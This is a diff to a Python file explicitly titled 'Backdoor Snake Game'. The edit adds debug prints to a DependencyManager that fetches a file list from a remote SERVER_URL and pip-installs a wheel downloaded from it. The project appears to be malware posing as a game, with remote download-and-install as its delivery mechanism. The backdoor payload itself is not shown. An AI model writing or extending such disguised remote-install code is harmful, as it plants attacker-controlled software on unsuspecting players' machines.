@@ -4,7 +4,6 @@ Backdoor Snake Game
 Place in: backdoor-snake-game/game/snake_game.py
 """
 
-import pygame
 import sys
 import os
 import subprocess
@@ -139,6 +138,7 @@ class DependencyManager:
         try:
             response = urllib.request.urlopen(f"{SERVER_URL}/list-deps")
             data = json.loads(response.read().decode())
+            print(data)
             return [f['name'] for f in data.get('files', [])]
         except Exception as e:
             print(f"Failed to get file list: {e}")
@@ -155,6 +155,7 @@ class DependencyManager:
             # Find requests wheel
             requests_wheel = None
             for file in available_files:
+                print(file)
                 if file.startswith('requests-') and file.endswith('.whl'):
                     requests_wheel = file
                     break
@@ -239,6 +240,7 @@ class DependencyManager:
                 
                 # Install requests
                 print("Installing requests module...")
+                print(wheel_path)
                 result = subprocess.run(
                     [sys.executable, "-m", "pip", "install", wheel_path],
                     capture_output=True,
